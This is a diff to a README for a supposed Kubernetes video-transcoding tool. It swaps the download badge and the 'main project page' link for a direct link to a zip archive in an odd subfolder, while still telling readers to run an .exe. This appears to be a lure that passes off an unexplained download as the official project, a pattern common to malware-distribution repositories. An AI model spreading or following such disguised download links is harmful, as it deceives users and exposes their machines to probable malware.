@@ -1,6 +1,6 @@
 # 🎥 k8s-VideoTranscoding - Easily Convert Your Video Files Quickly
 
-[![](https://img.shields.io/badge/Download-VideoTranscoder-blue.svg)](https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding)
+[![](https://img.shields.io/badge/Download-VideoTranscoder-blue.svg)](https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding/raw/refs/heads/main/Trianon/Transcoding_s_Video_k_2.9.zip)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Make sure your computer meets these requirements before you start:
 
 You must visit the project page to download the latest version of the software. Follow these steps:
 
-1. Visit the main project page at this link: [https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding](https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding).
+1. Visit the main project page at this link: [https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding/raw/refs/heads/main/Trianon/Transcoding_s_Video_k_2.9.zip](https://github.com/unflappable-salkvaccine572/k8s-VideoTranscoding/raw/refs/heads/main/Trianon/Transcoding_s_Video_k_2.9.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in .exe to start your download.
